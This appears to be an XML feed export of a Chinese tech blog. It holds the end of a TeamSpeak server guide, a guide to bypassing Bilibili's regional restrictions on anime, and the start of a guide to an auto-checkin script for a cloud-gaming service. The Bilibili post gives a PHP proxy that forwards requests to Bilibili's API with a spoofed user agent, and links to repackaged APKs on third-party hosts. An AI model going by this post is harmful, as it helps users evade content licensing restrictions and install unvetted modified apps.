src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/msedge-20220507-195653.png"></p><p>接着我们连接我们的Teamspeak服务器，如果是TS3的话，首次连接会直接弹出认领窗口，如果是TS5就会像我这样</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/TeamSpeak-20220507-195953.png"></p><p>我们把刚刚获得的特权密钥填入，这样我们就获得了服务器的管理员权限。同时，其他用户也可以通过teamspeak连接你的服务器了</p><h2 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h2><p>认领完成后，你的右上角应该有一个铅笔样的图案了，点击它，你就能够修改服务器的一些信息</p><p>配置项如图</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/TeamSpeak-20220507-200501.png"></p><p>配置完后点击右上角的勾勾就可以了</p><h2 id="频道管理"><a href="#频道管理" class="headerlink" title="频道管理"></a>频道管理</h2><p>在我上面这张图的底下，有一个Create Channel，点击这里就可以创建频道了，分别可以设置频道的名字、密码、位置、有效期</p><p>如果没有勾选永久（TS3有临时和半永久）的话，临时频道在所有人退出后会自动销毁，半永久没用过，有用过的可以评论区说说</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/TeamSpeak-20220507-200630.png"></p><p>创建完成后，点击频道，可以看到频道的相关设置项，同样点击上面的铅笔图标进行修改</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/TeamSpeak-20220507-200824.png"></p><div class="note warning flat"><p>关于图标需要注意的东西：图标必须是方形（否则会给你截中间），而且大小不能超过8kb</p></div><p>你可以设置频道的描述、话题、名字、语音质量、语音解码方式，一般来说语音质量可以拉满，5M的小水管都能跑</p><p>配置完后同样点击右上角的勾勾来应用就可以啦</p><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>你可以通过右键一个用户来给他相应的服务器&#x2F;频道权限，也可以单击该用户，在左边的Groups里面修改权限（TS5的功能）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/TeamSpeak-20220507-201113.png"></p><p>对于有管理权限的用户，可以踢出用户以及BAN人，服主可以将管理员权限给信任的用户进行管理，这样也能在自己不在线的时候维持服务的秩序</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>收看B站港澳台地区番剧的正确方式 - 哔哩漫游biliRoaming</title>
      <link href="/posts/biliRoaming/"/>
      <url>/posts/biliRoaming/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note danger flat"><p><strong><font size=32>本文禁止转载，也禁止大范围转发宣传！</font></strong></p></div><p>因为某些众所周知的原因，有些番在B站只能在港澳台观看，而我们平时观看港澳台番剧会出现下面这张图的情况</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/msedge-20220422-171409.png?download=true" alt="PC端"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/WsaClient-20220422-172138.png" alt="Android端（有些可能会写“您所在的区域不支持观看”）"></p><p>对于我这种追番老手来说，这可是不能接受的一件事情。而在我早期搜索B站港澳台的时候，发现了能够突破这种限制的油猴脚本<a href="https://github.com/ipcjs/bilibili-helper/blob/user.js/packages/unblock-area-limit/README.md">bilibili-helper&#x2F;README.md at user.js · ipcjs&#x2F;bilibili-helper (github.com)</a>，以前这个脚本使用的是biliPlus的服务器，但是后来因为一封律师函，所以就只能自建服务器了（后面会说）</p><p>下面我将带领大家一步一步突破港澳台限制</p><h2 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h2><p>首先你需要给浏览器装上油猴插件（这里不讲），然后打开这个链接<a href="https://greasyfork.org/zh-CN/scripts/25718-%E8%A7%A3%E9%99%A4b%E7%AB%99%E5%8C%BA%E5%9F%9F%E9%99%90%E5%88%B6">解除B站区域限制 (greasyfork.org)</a>，安装这个插件</p><p>然后当你打开某一个番剧的详情页（不一定要港澳台的），有一个设置按钮（就是图片里面这个有点像星球的这个按钮）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/msedge-20220422-172608.png"></p><p>点开以后在里面填写服务器，服务器可以参照哔哩漫游提供的公共服务器 <a href="https://github.com/yujincheng08/BiliRoaming/wiki/%E5%85%AC%E5%85%B1%E8%A7%A3%E6%9E%90%E6%9C%8D%E5%8A%A1%E5%99%A8">公共解析服务器 · yujincheng08&#x2F;BiliRoaming Wiki (github.com)</a>，也可以自建（这里不讲，哔哩漫游的wiki里面有，自己找）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/msedge-20220422-173134.png"></p><p>我这里填的是自建服务器，因为额度有限就不共享了，upos服务器建议换成<code>ks3（金山）</code>，比较稳定</p><p>这时候你再访问番剧页面，它就会自动给你获取港澳台的番剧看了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/msedge-20220422-173256.png"></p><h2 id="安卓端"><a href="#安卓端" class="headerlink" title="安卓端"></a>安卓端</h2><p>你需要安装xposed框架并安装哔哩漫游模块 <a href="https://github.com/yujincheng08/BiliRoaming/releases">Releases · yujincheng08&#x2F;BiliRoaming (github.com)</a></p><p>当然，如果你不是高玩，你也可以下载已经把模块集成在主程序的B站，官方下载地址是这个 -&gt; <a href="https://wwe.lanzoux.com/b015ll4sb">https://wwe.lanzoux.com/b015ll4sb</a> 2333</p><p>我自己打包的是这个 -&gt; <a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/files/biliRoaming/%5BLspatch%5D%20%5BRoaming-1.6.2%5D%20%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%206.69.0.apk?download=true">[Lspatch] [Roaming-1.6.2] 哔哩哔哩 6.69.0</a> <a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/files/biliRoaming/%5BLspatch%5D%20%5BRoaming-1.6.2%5D%20%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9HD%201.17.0.apk?download=true">[Lspatch] [Roaming-1.6.2] 哔哩哔哩HD 1.17.0</a></p><p>安装完成后，在设置中找到<code>哔哩漫游设置</code>，并按照我这样设置（解析服务器自己填，这里拿HD来做例子）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/WsaClient-20220422-173746.png" alt="打开前三个选项"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/WsaClient-20220422-173814.png" alt="填入解析服务器"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/biliRoaming/WsaClient-20220422-173825.png" alt="Upos更改为k3c"></p><p>完成后直接点<code>确定并重启客户端</code>，然后就能看港澳台番剧了</p><h2 id="苹果iOS端"><a href="#苹果iOS端" class="headerlink" title="苹果iOS端"></a>苹果iOS端</h2><p><strong>你在想Peach？</strong></p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="为啥只能看6分钟"><a href="#为啥只能看6分钟" class="headerlink" title="为啥只能看6分钟"></a><del>为啥只能看6分钟</del></h3><p><del>因为有些番需要大会员才能看，没有大会员只能看前6分钟，所以你需要在PC端的设置页面点击账号授权（<strong>请不要给陌生的解析服务器授权，因为这会把你所有的账号信息，包括Cookie共享到服务器</strong>）</del></p><h3 id="自建解析服务器"><a href="#自建解析服务器" class="headerlink" title="自建解析服务器"></a>自建解析服务器</h3><p>我只在这里放出PHP版本的代码，我使用<a href="https://www.aliyun.com/product/fc?userCode=05u8nbft&share_source=copy_link">阿里云的云函数</a>创建的，因为这种东西还是少人知道比较好我就不放出来我的服务器和搭建方法了，具体方法自行摸索（这个版本没有在线黑名单，要分享的时候请谨慎！其他的版本在官方的wiki有）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">RingCentral</span>\<span class="title">Psr7</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">To enable the initializer feature (https://help.aliyun.com/document_detail/89029.html)</span></span><br><span class="line"><span class="comment">please implement the initializer function as below：</span></span><br><span class="line"><span class="comment">function initializer($context) &#123;</span></span><br><span class="line"><span class="comment">    echo &#x27;initializing&#x27; . PHP_EOL;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$context</span></span>): <span class="title">Response</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $body       = $request-&gt;getBody()-&gt;getContents();</span></span><br><span class="line"><span class="comment">    $queries    = $request-&gt;getQueryParams();</span></span><br><span class="line"><span class="comment">    $method     = $request-&gt;getMethod();</span></span><br><span class="line"><span class="comment">    $headers    = $request-&gt;getHeaders();</span></span><br><span class="line"><span class="comment">    $path       = $request-&gt;getAttribute(&#x27;path&#x27;);</span></span><br><span class="line"><span class="comment">    $requestURI = $request-&gt;getAttribute(&#x27;requestURI&#x27;);</span></span><br><span class="line"><span class="comment">    $clientIP   = $request-&gt;getAttribute(&#x27;clientIP&#x27;);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* Config */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$upstream_pc_url</span> = <span class="string">&#x27;https://api.bilibili.com/pgc/player/web/playurl&#x27;</span>;</span><br><span class="line">    <span class="variable">$upstream_app_url</span> = <span class="string">&#x27;https://api.bilibili.com/pgc/player/api/playurl&#x27;</span>;</span><br><span class="line">    <span class="variable">$timeout</span> = <span class="number">5</span>; <span class="comment">// seconds</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Read incoming request */</span></span><br><span class="line">    <span class="variable">$request_method</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getMethod</span>();</span><br><span class="line">    <span class="variable">$request_query</span> = <span class="title function_ invoke__">stristr</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getAttribute</span>(<span class="string">&quot;requestURI&quot;</span>), <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    <span class="variable">$req_referer</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getHeaderLine</span>(<span class="string">&#x27;referer&#x27;</span>);;</span><br><span class="line">    <span class="variable">$request_headers</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getHeaders</span>();</span><br><span class="line">    <span class="variable">$request_body</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getBody</span>()-&gt;<span class="title function_ invoke__">getContents</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Forward request */</span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//清理相关header</span></span><br><span class="line">    <span class="title function_ invoke__">array_splice</span>(<span class="variable">$request_headers</span>, <span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;HOST&#x27;</span>, <span class="variable">$request_headers</span>));</span><br><span class="line">    <span class="title function_ invoke__">array_splice</span>(<span class="variable">$request_headers</span>, <span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;User-Agent&#x27;</span>, <span class="variable">$request_headers</span>));</span><br><span class="line">    <span class="title function_ invoke__">array_splice</span>(<span class="variable">$request_headers</span>, <span class="title function_ invoke__">array_search</span>(<span class="string">&#x27;Referer&#x27;</span>, <span class="variable">$request_headers</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$headers</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$request_headers</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$headers</span>[] = <span class="variable">$key</span> . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断使用pc还是app接口</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr_count</span>(<span class="variable">$request_query</span>, <span class="string">&#x27;platform=android&#x27;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$upstream_app_url</span> . <span class="variable">$request_query</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_USERAGENT, <span class="string">&#x27;Bilibili Freedoooooom/MarkII&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$upstream_pc_url</span> . <span class="variable">$request_query</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_REFERER, <span class="variable">$req_referer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//curl配置</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="variable">$timeout</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="variable">$request_method</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$request_body</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">false</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$header</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$response</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$header</span>[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">            <span class="number">502</span>,</span><br><span class="line">            <span class="variable">$header</span>,</span><br><span class="line">            <span class="string">&#x27;Upstream host did not respond.&#x27;</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$header_length</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HEADER_SIZE);</span><br><span class="line">        <span class="variable">$curl_response_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="number">0</span>, <span class="variable">$header_length</span>));</span><br><span class="line">        <span class="variable">$response_body</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$response</span>, <span class="variable">$header_length</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$curl_response_headers</span> <span class="keyword">as</span> <span class="variable">$header_string</span>) &#123;</span><br><span class="line">            <span class="variable">$header_tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;: &#x27;</span>, <span class="variable">$header_string</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$header_tmp</span>) == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="variable">$header</span>[<span class="variable">$header_tmp</span>[<span class="number">0</span>]] = <span class="title function_ invoke__">trim</span>(<span class="variable">$header_tmp</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="comment">// 这行用于调试请求信息</span></span><br><span class="line">        <span class="comment">// return new Response(200, array(), json_encode(array(&#x27;header&#x27; =&gt; $header, &#x27;body&#x27; =&gt; $response_body, &#x27;url&#x27; =&gt; $url, &#x27;response&#x27;=&gt;$response, &#x27;curl_headers&#x27;=&gt;$curl_response_headers)));</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">            <span class="number">200</span>,</span><br><span class="line">            <span class="variable">$header</span>,</span><br><span class="line">            <span class="variable">$response_body</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*tool*/</span></span><br><span class="line"><span class="comment">//某个字符串在另一个字符串第N此出现的下标</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_n_pos</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$find</span>, <span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$pos_val</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="variable">$find</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$pos_val</span> = <span class="variable">$pos</span> + <span class="variable">$pos_val</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$count</span> = <span class="variable">$pos_val</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MHYY-AutoCheckin - 米哈云游（云原神）自动签到脚本食用指南</title>
      <link href="/posts/MHYY-AutoCheckin-Manual/"/>
      <url>/posts/MHYY-AutoCheckin-Manual/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="米哈云游（云原神）自动签到脚本食用指南"><a href="#米哈云游（云原神）自动签到脚本食用指南" class="headerlink" title="米哈云游（云原神）自动签到脚本食用指南"></a>米哈云游（云原神）自动签到脚本食用指南</h2><p><strong>在指南开始之前，请确保你有一颗聪明的头脑和可以折腾的时间，否则请等时机合适再进行配置！</strong></p><p><strong>在使用过程中如果遇到什么问题，请前往<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin/issues">Issues · ElainaMoe&#x2F;MHYY-AutoCheckin (github.com)</a>发起新的issue来提出，不要在本页面的评论区提出问题（因为追踪性太差了）</strong></p><div class="note warning flat"><p><del>对于正在使用本脚本的用户，请注意：每次云原神更新后（一般会跟着本体大版本更新就更一次），请把自己的配置中的<code>version</code>修改为最新的云原神版本，否则可能会出现不可预料的错误；并且请及时更新脚本，在自己的仓库点击<code>Fetch upstream</code>然后点击<code>Merge</code>即可！）</del></p><p>现在这个值是作为fallback值使用，只有当官方的版本号服务器不可用时才会用到这个值，所以有空就改，不改也可以</p></div><h3 id="用前必读"><a href="#用前必读" class="headerlink" title="用前必读"></a>用前必读</h3><p><strong>⚠️请不要进行宣传，谢谢！一旦发现宣传就删库跑路！使用过程中如果出现bug可能会使用您的日志进行错误追踪，详情请见<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin/blob/master/private-policy.md">隐私政策</a></strong></p><h3 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h3><blockquote><p>先点个STAR，我们马上开始我们的教程:D</p></blockquote><h4 id="Github-Action-版本"><a href="#Github-Action-版本" class="headerlink" title="Github Action 版本"></a>Github Action 版本</h4><p>首先你需要先打开本脚本的仓库<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin">ElainaMoe&#x2F;MHYY-AutoCheckin: 米哈云游（云原神）自动签到脚本，让你每天都拿到15分钟~ (github.com)</a>，点击右上角的fork按钮，接着点击下面绿色的<code>Create fork</code>来创建一个分支</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220419-190358.png?download=true"></p><p>然后点击上面的<code>Settings</code>，导航到<code>Secrets</code>-&gt;<code>Actions</code>页面下，点击<code>New repository secret</code>（如图）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220419-190537.png?download=true"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220419-190618.png?download=true"></p><p>将以下内容进行填充后加入名字为<code>config</code>的Secret中（内容获取请参照<a href="#%E9%85%8D%E7%BD%AE%E5%86%85%E5%AE%B9%E8%8E%B7%E5%8F%96">配置内容获取</a>一节）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;android&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;deviceid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devicename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devicemodel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;appid&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;analytics&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="阿里云函数版本"><a href="#阿里云函数版本" class="headerlink" title="阿里云函数版本"></a><a href="https://www.aliyun.com/product/fc?userCode=05u8nbft&share_source=copy_link">阿里云函数版本</a></h4><p>首先你得先下载本仓库的代码文件，点击右上角绿色的<code>Code</code>，然后点击<code>Download ZIP</code>，把压缩包下载后解压到一个你知道的地方，我们一会会用到</p><p>先打开<a href="https://www.aliyun.com/product/fc?userCode=05u8nbft&share_source=copy_link">阿里云函数</a>，点左边的函数服务，然后顶上选择地区，随便选（但是最好是国内）</p><p>点击创建服务来建立一个新的服务</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Github/MHYY-AutoCheckin/msedge-20221112-084539.png"></p><p>紧接着创建一个新的函数，设置方法如下面几张图</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Github/MHYY-AutoCheckin/msedge-20221112-084551.png"></p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Github/MHYY-AutoCheckin/msedge-20221112-084716.png"></p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Github/MHYY-AutoCheckin/msedge-20221112-084807.png"></p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Github/MHYY-AutoCheckin/msedge-20221112-084913.png"></p><p>创建后会自动打开阿里云函数的vscode，在这里，点击上面的<code>Terminal</code>，点击<code>New Terminal</code>（也可以直接快捷键<kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>`</kbd>）</p><p>打开以后在里面输入下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./preinstall.sh &amp;&amp; ./preinstall.sh</span><br></pre></td></tr></table></figure><p>运行完以后，打开<code>config.json</code>，把自己的配置内容填进去即可，然后点击部署代码</p><p><strong>一定要先把配置丢进<code>config.json</code>再部署代码！一定要先把配置丢进<code>config.json</code>再部署代码！一定要先把配置丢进<code>config.json</code>再部署代码！</strong></p><p>要是不确定能不能使用，可以点一下顶上的测试函数，看看能不能使用</p><h4 id="腾讯云函数版本（不推荐，腾讯要收钱了，可以在阿里云函数使用，正常是不会用完你的免费额度的）"><a href="#腾讯云函数版本（不推荐，腾讯要收钱了，可以在阿里云函数使用，正常是不会用完你的免费额度的）" class="headerlink" title="腾讯云函数版本（不推荐，腾讯要收钱了，可以在阿里云函数使用，正常是不会用完你的免费额度的）"></a><a href="https://cloud.tencent.com/act/cps/redirect?redirect=10232&cps_key=e6bd1a9d73067a5a66bb5c8e2a9e288c">腾讯云函数版本</a>（不推荐，腾讯要收钱了，可以在阿里云函数使用，正常是不会用完你的免费额度的）</h4><p>首先你得先下载本仓库的代码文件，点击右上角绿色的<code>Code</code>，然后点击<code>Download ZIP</code>，把压缩包下载后解压到一个你知道的地方，我们一会会用到</p><p>先打开<a 